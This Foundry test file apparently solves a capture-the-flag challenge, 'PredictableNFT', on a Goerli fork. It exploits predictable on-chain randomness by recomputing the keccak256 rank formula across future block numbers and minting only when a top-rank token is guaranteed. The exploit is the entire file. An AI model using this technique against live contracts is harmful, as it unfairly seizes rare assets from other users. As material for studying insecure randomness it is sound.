// SPDX-License-Identifier: UNLICENSED
pragma solidity ^ 0.8.17;

import "forge-std/Test.sol";

contract PredictableNFTTest is Test {
	address nft;

	address hacker = address(0x1234);

	function setUp() public {
		vm.createSelectFork("https://rpc.ankr.com/eth_goerli");
		vm.deal(hacker, 1 ether);
		nft = address(0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC);
	}

	function test() public {
		vm.startPrank(hacker);

    // initail mintedId to the current id
    (, bytes memory res) = nft.call(abi.encodeWithSignature("id()"));
    uint mintedId = uint256(bytes32(res));
		uint currentBlockNum = block.number;

		// Mint a Superior one, and do it within the next 100 blocks.
		for(uint i=0; i<100; i++) {
			vm.roll(currentBlockNum);

			// ---- hacking time ----
			// 1. why mintedId + 1 ? the mintedId is incremented by 1 before determining the rank of the token.
			// 2. why uint(uint160(hacker)) ? convert the address variable to uint256
      if (uint256(keccak256(abi.encodePacked(mintedId+1, uint(uint160(hacker)), currentBlockNum))) % 100 > 90 ) {
        (, res) = nft.call{value: 1 ether}(abi.encodeWithSignature("mint()"));
        mintedId = uint256(bytes32(res));
        break;
      }

			currentBlockNum++;
		}

		// get rank from `mapping(tokenId => rank)`
		(, bytes memory ret) = nft.call(abi.encodeWithSignature(
			"tokens(uint256)",
			mintedId
		));
		uint mintedRank = uint(bytes32(ret));
		assertEq(mintedRank, 3, "not Superior(rank != 3)");
	}
}